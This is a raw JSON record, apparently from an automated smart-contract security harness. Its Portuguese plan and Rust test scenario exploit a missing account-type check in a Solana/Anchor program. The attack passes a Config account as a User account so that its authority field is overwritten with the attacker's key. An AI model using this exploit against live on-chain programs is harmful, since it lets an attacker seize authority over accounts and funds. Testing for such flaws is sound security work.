attempts.raw:
{
  "plan": "O programa-alvo usa AccountInfo e desserializa manualmente um struct User com um booleano `discriminator` no inicio, sem validar um discriminador de 8 bytes do Anchor. O baseline usa uma conta com dados que representam um User valido (discriminator=true) e deve ter sucesso. O ataque fornece uma conta de outro tipo (por exemplo, uma conta de configuracao cujos primeiros bytes sao um booleano true) para que o programa a interprete como User e sobrescreva o campo authority. O efeito medido e que a conta de configuracao passa a ter o campo authority sobrescrito com a chave do atacante, algo que o uso legitimo nao faria.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

// Conta User valida para o baseline: discriminador booleano true + authority
let user_data = anchor_account_data("User", &(true, authority));
let user_account = account(&env.program_id, &user_data, None);

let baseline_ix = env.anchor_ix("initialize", &(), vec![
    AccountMeta::new(user_account_key, false),
    AccountMeta::new_readonly(authority, true),
]);
let baseline_accounts = vec![
    (user_account_key, user_account.clone()),
    (authority, wallet(1_000_000_000)),
];
let baseline_result = env.baseline("initialize legitimo com User valido", &baseline_ix, &baseline_accounts);

// Ataque: conta de outro tipo (Config) com booleano true no inicio
let config_data = anchor_account_data("Config", &(true, Pubkey::new_unique()));
let config_account = account(&env.program_id, &config_data, None);

let attack_ix = env.anchor_ix("initialize", &(), vec![
    AccountMeta::new(config_account_key, false),
    AccountMeta::new_readonly(attacker, true),
]);
let attack_accounts = vec![
    (config_account_key, config_account.clone()),
    (attacker, wallet(1_000_000_000)),
];
let attack_result = env.attack("initialize com conta Config no lugar de User", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let after_data = after(&attack_result, &config_account_key).data();
    // O campo authority (offset 1 apos o booleano) deve ter sido sobrescrito com a chave do atacante
    let stored_authority = read_pubkey(after_data, 1);
    env.effect("authority da conta Config sobrescrito com a chave do atacante", stored_authority == attacker);
}"
}

